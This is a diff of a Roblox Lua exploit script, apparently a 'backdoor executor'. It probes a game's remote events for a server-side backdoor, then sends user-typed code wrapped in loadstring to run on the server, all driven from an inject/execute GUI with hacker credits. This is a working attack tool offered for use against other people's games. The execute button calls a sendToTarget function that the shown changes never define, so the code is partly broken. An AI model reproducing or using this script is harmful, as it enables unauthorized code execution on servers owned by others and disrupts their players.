@@ -1,3 +1,9 @@
+--ChatGPT Renamed everything and I'm to lazy to fix it
+--Injection took 3 days to finish (That was made by Ices)
+--Made by Yaazkidd (Or CurseDew)
+
+print("Parliament haxcked")
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
@@ -7,8 +13,6 @@ local LocalPlayer = Players.LocalPlayer
 local foundRemote = nil
 local injected = false
 
-
---this inject code took me 3 days to finish lmao
 local function scanForBackdoors()
     local foundRemotes = {}
     local markerId = "Marker_" .. tostring(math.random(100000,999999))
@@ -24,7 +28,7 @@ local function scanForBackdoors()
                 if string.find(obj:GetFullName(), "RobloxReplicatedStorage") then
                     continue
                 end
-                local testCommand = "print('It worked! Wow.')" --test command, it will fire server when worked
+                local testCommand = "print('It worked! Wow.')" 
                 if obj:IsA("RemoteEvent") then
                     obj:FireServer(testCommand)
                 else
@@ -43,9 +47,19 @@ local function scanForBackdoors()
     return nil
 end
 
+local function prepareCode(code)
+    if type(code) ~= "string" then
+        code = tostring(code)
+    end
+    local trimmed = code:match("^%s*(.-)%s*$")
+    if trimmed:match("^%s*require%(") or trimmed:match("^%s*loadstring%(") then
+        return code
+    end
+    return 'loadstring([==['..code..']==])()'
+end
 
---send code part is where you send the fire event
 local function sendCode(code)
+    code = prepareCode(code)
     if foundRemote and typeof(foundRemote) == "Instance" then
         local success, errorMsg = pcall(function()
             if foundRemote:IsA("RemoteEvent") then
@@ -60,7 +74,6 @@ local function sendCode(code)
     end
 end
 
---dont know how to explain
 local function getPlayerFromName(name)
     for _, player in pairs(Players:GetPlayers()) do
         if player.Name:lower() == name:lower() or player.DisplayName:lower() == name:lower() then
@@ -131,6 +144,7 @@ textBox.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 textBox.ClearTextOnFocus = false
 textBox.MultiLine = true
+textBox.TextWrapped = true
 textBox.PlaceholderText = "Reason why i use"
 textBox.Text = "Use this shit idk"
 textBox.Font = Enum.Font.Code
@@ -427,7 +441,7 @@ end)
 execute.MouseButton1Click:Connect(function()
  local scriptText = textBox.Text
  if injected and scriptText ~= "" then
-  sendCode(scriptText)
+  sendToTarget(scriptText)
  end
 end)
 
@@ -435,7 +449,6 @@ clear.MouseButton1Click:Connect(function()
  textBox.Text = ""
 end)
 
---took me a while
 inject.MouseButton1Click:Connect(function()
  if not injected then
   foundRemote = scanForBackdoors()
@@ -481,7 +494,6 @@ game:GetService("UserInputService").InputChanged:Connect(function(input)
  end
 end)
 
---shitty toggle but yh
 local shit = false
 local toggleButton = Instance.new("ImageButton")
 toggleButton.Size = UDim2.new(0, 50, 0, 50)
@@ -512,7 +524,14 @@ warn("Testing warn")
 
 --Made By Yaazkidd
 --Found = can skid
---Code by Curse (Yaazkidd lmao why do I need to!!)
 --My Dizcord: teamdbq
---Also thanks to Syntex for giving me another backdoor code. Appreciate it.
---Changed, Sunday, 12 October. I have changed the injection code and added some misc things, stay tune <3
+--Featuring Feima, Curse, Yaazkid. (Ices and Kenzie having fun on the park dw)
+
+
+--Credits 2!!!
+
+--Feima made the injection code that took 3 days to finish because it works when skid still using kidd guis
+--Kenzie made the target code
+--Ices did the moving outline.
+
+print("Thanks!")
